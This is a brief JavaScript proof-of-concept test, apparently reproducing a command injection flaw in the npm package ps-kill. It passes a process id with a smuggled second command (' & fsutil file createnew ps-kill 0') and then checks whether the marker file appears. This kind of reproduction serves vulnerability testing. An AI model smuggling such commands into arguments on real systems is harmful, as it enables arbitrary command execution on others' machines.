// test("Command Injection in ps-kill", (done) => {
//   expect.assertions(3);
//   expect.assertions(2);
  const ps_kill = require("ps-kill");
  const fs = require("fs");
  const path = "./ps-kill";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  ps_kill.kill(" & fsutil file createnew ps-kill 0", function (error) {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, function (err) {
//       done();
    });
  });
// });
